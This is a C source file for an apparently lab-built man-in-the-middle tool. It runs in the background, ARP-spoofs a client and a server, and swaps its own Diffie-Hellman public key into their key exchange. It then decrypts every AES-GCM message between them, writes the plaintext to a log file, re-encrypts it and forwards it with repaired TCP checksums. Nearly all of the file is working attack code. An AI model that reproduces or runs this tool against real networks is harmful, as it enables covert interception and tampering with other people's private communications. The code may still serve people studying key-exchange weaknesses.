#include "DH.h"
#include "aes.h"
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <gmp.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define PCAP_BUF_MAX 1024 * 2
#define SK_BUF_MAX 1024

const int portno = 5001;

void die(const char *msg) {
  perror(msg);
  exit(1);
}

typedef struct IP_T {
  uint8_t client_ip[0x10];
  uint8_t server_ip[0x10];
  pcap_t *iface;
} IP_T;

typedef struct psd_header {
  uint32_t saddr;
  uint32_t daddr;
  uint8_t must_be_zero;
  uint8_t protocol;
  uint16_t tcp_len;
} psd_header;

struct MITM_ctx {
  mpz_t p;
  mpz_t g;
  mpz_t pri_key;    //
  mpz_t pub_key;    //
  mpz_t client_key; //
  mpz_t server_key; //
};

struct MITM_ctx m_ctx;
uint8_t client_key[0x20];
uint8_t server_key[0x20];
uint8_t *c_w;
uint8_t *s_w;

int log_fd = -1;

uint16_t calc_checksum(void *pkt, int len) {
  uint16_t *buf = (uint16_t *)pkt;
  uint32_t checksum = 0;
  while (len > 1) {
    checksum += *buf++;
    checksum = (checksum >> 16) + (checksum & 0xffff);
    len -= 2;
  }
  if (len) {
    checksum += *((uint8_t *)buf);
    checksum = (checksum >> 16) + (checksum & 0xffff);
  }
  return (uint16_t)((~checksum) & 0xffff);
}

// set tcp head
void set_psd_header(struct psd_header *ph, struct iphdr *ip, uint16_t tcp_len) {
  ph->saddr = ip->saddr;
  ph->daddr = ip->daddr;
  ph->must_be_zero = 0;
  ph->protocol = 6; // 6 TCP
  ph->tcp_len = htons(tcp_len);
}
void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
                  const u_char *packet);

void hexdump(const uint8_t *buf, size_t len) {
  size_t i;
  for (i = 0; i < len; i++) {
    if (i % 0x10 == 0) {
      printf("\n[%04x]:", i);
    }
    printf("%02x ", buf[i]);
  }
  printf("\n");
}

int main(int argc, char **argv) {
  if (argc != 3) {
    die("[!] Usage: ./middle client_ip server_ip");
  }
  daemon(1, 1);                  // run in background
  char errbuf[PCAP_ERRBUF_SIZE]; // pcap error buffer
  pcap_if_t *alldevs = NULL;
  pcap_t *descr = NULL;
  char *device = NULL;
  struct bpf_program filter;
  IP_T ip_t;

  if (pcap_findalldevs(&alldevs, errbuf) == -1) {
    fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
    die("[!] Error in pcap_findalldev");
  }

  device = alldevs->name; // ens33
  mpz_inits(m_ctx.p, m_ctx.g, m_ctx.pri_key, m_ctx.pub_key, m_ctx.client_key,
            m_ctx.server_key, NULL);

  mpz_set_ui(m_ctx.g, 5); // g = 5

  // arp cheat
  arpspoof(device, argv[1], argv[2], 8);
  arpspoof(device, argv[2], argv[1], 8);

  // printf("[+] Choose device %s\n", device);

  descr = pcap_open_live(device, PCAP_BUF_MAX, 1, 1024, errbuf);
  if (descr == NULL) {
    die("[!] Failed to open device");
  }

  log_fd = open("mitm_log.txt", O_RDWR | O_CREAT, 0666);
  if (log_fd < 0) {
    die("[!] Failed to open log file");
  }

  char rule[128];
  memset(rule, 0, 128);
  sprintf(rule,
          "(src host %s and dst host %s) or (src host %s and dst host %s)",
          argv[1], argv[2], argv[2], argv[1]);

  if (pcap_compile(descr, &filter, rule, 1, 0) < 0) {
    die("[!] Error at pcap_compile");
  }

  if (pcap_setfilter(descr, &filter) < 0) {
    die("[!] Error at pcap_setfilter");
  }

  bzero(&ip_t, sizeof(ip_t));
  ip_t.iface = descr;
  memcpy(ip_t.client_ip, argv[1], 0x10);
  memcpy(ip_t.server_ip, argv[2], 0x10);

  int ret = 0;
  if ((ret = pcap_loop(descr, 0, tcp_callback, (uint8_t *)&ip_t)) != 0) {
    die("[!] Error at pcap_loop");
  }

  mpz_clears(m_ctx.p, m_ctx.g, m_ctx.pri_key, m_ctx.pub_key, m_ctx.client_key,
             m_ctx.server_key);
  close(log_fd);
}

void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
                  const u_char *packet) {

  uint8_t src_ip[0x10];
  uint8_t dst_ip[0x10];
  uint8_t client_mac[] = {0x00, 0x0c, 0x29, 0x7a, 0x37, 0xcf};
  uint8_t server_mac[] = {0x00, 0x0c, 0x29, 0x70, 0xfd, 0xa4};
  uint8_t middle_mac[] = {0x00, 0x0c, 0x29, 0x79, 0x59, 0xbc};

  struct ether_header *ethernet = (struct ether_header *)(packet); // ether head
  struct iphdr *ip = (struct iphdr *)(packet + ETHER_HDR_LEN);     // ip head
  struct tcphdr *tcp = (struct tcphdr *)(packet + ETHER_HDR_LEN +
                                         sizeof(struct iphdr)); // tcp head
  int header_len = ETHER_HDR_LEN + sizeof(struct iphdr) +
                   sizeof(struct tcphdr) + 12; // head size which consist data
  int data_len = pkthdr->len - header_len;     // 数据包数据真实长度
  uint8_t *raw_data = packet + header_len;
  char log_buf[0x100];
  bzero(src_ip, 16);
  bzero(dst_ip, 16);
  inet_ntop(AF_INET, &(ip->saddr), src_ip, 16); // src_ip
  inet_ntop(AF_INET, &(ip->daddr), dst_ip, 16); // dst_ip

  if ((!strncmp(src_ip, ip_t->client_ip, strlen(src_ip))) &&
      (!strncmp(dst_ip, ip_t->server_ip, strlen(src_ip)))) {

    memcpy((char *)ethernet + 6, middle_mac, 6); // fix mac
    memcpy(ethernet, server_mac, 6);

    if (data_len == SK_BUF_MAX) { // this have data we need

      bzero(log_buf, sizeof(log_buf));
      memcpy(log_buf, "************************\n", 25);
      sprintf(log_buf + 25, "c(%s) -> s(%s) size:%d\n", src_ip, dst_ip,
              data_len);
      write(log_fd, log_buf, strlen(log_buf));

      if (!strncmp(raw_data, "pri", 3)) { // p

        mpz_init_set_str(m_ctx.p, raw_data + 3, 16);
        generate_pri_key(m_ctx.pri_key);
        mpz_powm(m_ctx.pub_key, m_ctx.g, m_ctx.pri_key, m_ctx.p);
        gmp_printf("[+] middle public key(A): %Zd\n\n", m_ctx.pub_key);

      } else if (!strncmp(raw_data, "pub", 3)) { // pub A

        mpz_t A;
        mpz_init_set_str(A, raw_data + 3, 16);
        gmp_printf("[+] client public key(A): %Zd\n\n", A);

        // c_s =  A^m mod p
        mpz_powm(m_ctx.client_key, A, m_ctx.pri_key, m_ctx.p);
        gmp_printf("[+] middle-client key(A): %Zd\n\n", m_ctx.client_key);
        mpz_get_str(client_key, 16, m_ctx.client_key);

        c_w = AES_init(client_key, sizeof(client_key));
        AES_set_iv(NULL);

        // write middle pub_key
        mpz_get_str(raw_data + 3, 16, m_ctx.pub_key);
        uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);

        // fix checksum
        unsigned char *checksum_ptr =
            (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
        struct psd_header ph;
        bzero(&ph, sizeof(struct psd_header));
        bzero(checksum_ptr, tcp_len + sizeof(ph));
        set_psd_header(&ph, ip, tcp_len);
        memcpy(checksum_ptr, (void *)(&ph), sizeof(ph));
        tcp->check = 0;
        memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
        tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
        free(checksum_ptr);

      } else { // msg

        char text[SK_BUF_MAX];
        uint8_t msg[0x10], mac[0x10];
        // use client key decrypt
        bzero(text, sizeof(text));
        AES_gcm_decrypt(raw_data, SK_BUF_MAX, text, c_w);
        // printf("text: %s\n", text);
        write(log_fd, text + 3, strlen(text + 3));
        // use server key encrypt
        AES_gcm_encrypt(text, SK_BUF_MAX, raw_data, s_w, msg, mac);
        uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);

        // fix checksum
        unsigned char *checksum_ptr =
            (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
        struct psd_header ph;
        bzero(&ph, sizeof(struct psd_header));
        bzero(checksum_ptr, tcp_len + sizeof(ph));
        set_psd_header(&ph, ip, tcp_len);
        memcpy(checksum_ptr, (void *)(&ph), sizeof(ph));
        tcp->check = 0;
        memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
        tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
        free(checksum_ptr);
      }
    }
  } else if ((!strncmp(src_ip, ip_t->server_ip, strlen(src_ip))) &&
             (!strncmp(dst_ip, ip_t->client_ip, strlen(src_ip)))) {

    memcpy((char *)ethernet + 6, middle_mac, 6); // fix mac
    memcpy(ethernet, client_mac, 6);

    if (data_len == SK_BUF_MAX) { // this have data we need

      bzero(log_buf, sizeof(log_buf));
      memcpy(log_buf, "************************\n", 25);
      sprintf(log_buf + 25, "s(%s) -> c(%s) size:%d\n", src_ip, dst_ip,
              data_len);
      write(log_fd, log_buf, strlen(log_buf));

      if (!strncmp(raw_data, "pub", 3)) {
        mpz_t B;
        mpz_init_set_str(B, raw_data + 3, 16);
        gmp_printf("[+] server public key(B): %Zd\n\n", B);

        // c_s =  A^m mod p
        mpz_powm(m_ctx.server_key, B, m_ctx.pri_key, m_ctx.p);
        gmp_printf("[+] middle-server key: %Zd\n\n", m_ctx.server_key);
        mpz_get_str(server_key, 16, m_ctx.server_key);

        s_w = AES_init(server_key, sizeof(server_key));
        AES_set_iv(NULL);

        // write middle pub_key
        mpz_get_str(raw_data + 3, 16, m_ctx.pub_key);
        uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);

        // fix checksum
        unsigned char *checksum_ptr =
            (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
        struct psd_header ph;

        bzero(&ph, sizeof(struct psd_header));
        bzero(checksum_ptr, tcp_len + sizeof(ph));
        set_psd_header(&ph, ip, tcp_len);
        memcpy(checksum_ptr, (void *)(&ph), sizeof(ph));
        tcp->check = 0;
        memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
        tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
        free(checksum_ptr);

      } else { // msg

        char text[SK_BUF_MAX];
        uint8_t msg[0x10], mac[0x10];

        // use server key decrypt
        bzero(text, sizeof(text));
        AES_gcm_decrypt(raw_data, SK_BUF_MAX, text, s_w);
        // printf("text: %s\n", text);
        write(log_fd, text + 3, strlen(text + 3));

        // use client key encrypt
        AES_gcm_encrypt(text, SK_BUF_MAX, raw_data, c_w, msg, mac);
        uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);

        // fix checksum
        unsigned char *checksum_ptr =
            (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
        struct psd_header ph;

        bzero(&ph, sizeof(struct psd_header));
        bzero(checksum_ptr, tcp_len + sizeof(ph));
        set_psd_header(&ph, ip, tcp_len);
        memcpy(checksum_ptr, (void *)(&ph), sizeof(ph));
        tcp->check = 0;
        memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
        tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
        free(checksum_ptr);
      }
    }
  }
  // hexdump(packet, pkthdr->len);
  pcap_sendpacket(ip_t->iface, packet, pkthdr->len);
}